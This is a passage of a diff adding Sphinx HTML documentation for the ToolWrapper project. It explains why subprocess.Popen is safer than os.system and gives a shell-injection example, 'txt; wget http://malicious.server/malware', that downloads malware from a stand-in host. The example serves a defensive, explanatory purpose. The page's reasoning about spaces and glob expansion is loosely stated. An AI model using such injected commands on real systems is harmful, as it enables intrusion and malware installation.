+<div><div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">list_extension</span><span class="p">(</span><span class="n">ext</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;ls -1 *.&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ext</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>This function is supposed to list all the files of a given extension in the directory. But if, instead of passing <code class="docutils literal"><span class="pre">txt</span></code> as argument, I pass <code class="docutils literal"><span class="pre">txt;</span> <span class="pre">wget</span> <span class="pre">http://malicious.server/malware</span></code> then, the function will list the files with <code class="docutils literal"><span class="pre">txt</span></code> extension and download the malware from the malicious server!</p>
+<p>Now, with <code class="docutils literal"><span class="pre">subprocess.Popen</span></code>, you can't do such a thing because spaces are not allowed inside arguments:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">list_extension</span><span class="p">(</span><span class="n">ext</span><span class="p">):</span>
+    <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="s2">&quot;*.&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ext</span><span class="p">)])</span>
+</pre></div>
+</div>
+</div></blockquote>
+</li>
+<li><p class="first"><code class="docutils literal"><span class="pre">subprocess</span></code> open a Pipe between the python process and the subprocess whereas <code class="docutils literal"><span class="pre">os.system</span></code> calls a subshell independant of the first. This difference makes the communication between the subprocess and your python code far more easy with <code class="docutils literal"><span class="pre">subprocess</span></code> instead of <code class="docutils literal"><span class="pre">os.system</span></code> in which it is nearly impossible</p>
+</li>
+</ul>
+</div>
+<p>packager Toolwrapper avec models</p>
+</div>
+</div>
+</div>
+
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="index.html">Table Of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">ToolWrapper development</a><ul>
+<li><a class="reference internal" href="#developing-basic-toolwrappers">Developing basic <cite>Toolwrappers</cite></a><ul>
+<li><a class="reference internal" href="#declaring-your-class">Declaring your class</a><ul>
+<li><a class="reference internal" href="#toolwrapper-specifying-methods"><cite>Toolwrapper</cite> specifying methods</a><ul>
+<li><a class="reference internal" href="#describing-files-specify-input-file-and-specif-output-file">Describing files: <code class="docutils literal"><span class="pre">specify_input_file</span></code> and <code class="docutils literal"><span class="pre">specif_output_file</span></code></a></li>
+<li><a class="reference internal" href="#describing-tables-specify-input-table-and-specify-output-table">Describing tables: <code class="docutils literal"><span class="pre">specify_input_table</span></code> and <code class="docutils literal"><span class="pre">specify_output_table</span></code></a></li>
+<li><a class="reference internal" href="#describing-paramaters-specify-params">Describing paramaters: <code class="docutils literal"><span class="pre">specify_params</span></code></a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#declaring-the-method-run">Declaring the method <code class="docutils literal"><span class="pre">run</span></code></a><ul>
+<li><a class="reference internal" href="#calling-files-self-input-file-and-self-output-file">Calling files: <code class="docutils literal"><span class="pre">self.input_file</span></code> and <code class="docutils literal"><span class="pre">self.output_file</span></code></a></li>
+<li><a class="reference internal" href="#calling-models-self-input-table-and-self-output-table">Calling models: <code class="docutils literal"><span class="pre">self.input_table</span></code> and <code class="docutils literal"><span class="pre">self.output_table</span></code></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a class="reference internal" href="#declaring-a-model">Declaring a model</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#developing-advanced-toolwrappers">Developing Advanced <cite>Toolwrappers</cite></a><ul>
+<li><a class="reference internal" href="#parametrize-inputs-and-outputs">Parametrize inputs and outputs</a></li>
+<li><a class="reference internal" href="#inherit-models">Inherit models</a></li>
+<li><a class="reference internal" href="#executing-clean-command-line">Executing clean command line</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="index.html">Documentation overview</a><ul>
+      <li>Previous: <a href="use.html" title="previous chapter">Usage</a></li>
+      <li>Next: <a href="dev_wop.html" title="next chapter">Software Documentation</a></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="search.html" method="get">
+      <div><input type="text" name="q" /></div>
+      <div><input type="submit" value="Go" /></div>
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2016, Luc Giffon, Aitor Gonzalez, Lionel Spinelli.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.4.5</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.9</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
